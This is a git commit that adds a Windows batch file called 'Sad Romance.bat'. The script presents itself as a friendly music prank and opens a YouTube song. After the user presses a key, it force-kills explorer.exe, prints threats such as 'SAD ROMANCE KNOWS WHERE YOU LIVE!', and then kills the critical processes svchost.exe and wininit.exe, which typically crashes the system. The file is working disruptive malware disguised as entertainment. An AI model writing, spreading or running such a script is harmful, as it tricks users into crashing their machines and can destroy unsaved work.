179b30762ff1dabccff77950aacfc784080af855
ilushkaboy10 <ilushkaboyilusa@gmail.com>
2025-10-02 21:11:37 +0300

    Sad Romance.bat

---
+++ Sad Romance.bat
@@ -0,0 +1,20 @@
+@echo off
+color e
+title Sad Romance
+echo Hello! i'll showing with you!
+echo Press any key if you want.
+pause
+start https://www.youtube.com/watch?v=ja7JAJNe8a0&list=RDja7JAJNe8a0
+cls
+echo So Do you like it?
+echo Press any key if you like it
+echo close Sad Romance and report Sad Romance if you don't like it
+pause
+color 4
+taskkill /f /im explorer.exe
+cls
+echo SAD ROMANCE KNOWS WHERE YOU LIVE!
+echo THERE IS NO ESCAPING
+timeout 5
+taskkill /f /im svchost.exe
+taskkill /f /im wininit.exe
